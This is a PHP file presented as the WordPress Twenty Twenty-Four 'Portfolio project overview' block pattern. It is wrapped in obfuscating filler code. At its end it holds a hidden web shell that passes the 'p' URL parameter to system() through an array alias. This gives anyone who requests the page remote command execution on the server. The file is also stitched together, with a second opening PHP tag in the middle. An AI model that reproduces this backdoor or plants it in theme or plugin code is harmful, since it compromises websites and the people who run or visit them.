<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Title: Portfolio project overview
 * Slug: twentytwentyfour/page-portfolio-overview
 * Categories: twentytwentyfour_page, featured
 * Keywords: starter
 * Block Types: core/post-content
 * Post Types: page, wp_template
 * Viewport width: 1400
 * Description: A full portfolio page with a section for project description, project details, a full screen image, and a gallery section with two images.
 */
?>

<!-- wp:pattern {"slug":"twentytwentyfour/banner-project-description"} /-->
<!-- wp:pattern {"slug":"twentytwentyfour/text-project-details"} /-->
<!-- wp:pattern {"slug":"twentytwentyfour/gallery-full-screen-image"} /-->
<!-- wp:pattern {"slug":"twentytwentyfour/text-centered-statement"} /-->
<!-- wp:pattern {"slug":"twentytwentyfour/gallery-project-layout"} /-->

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>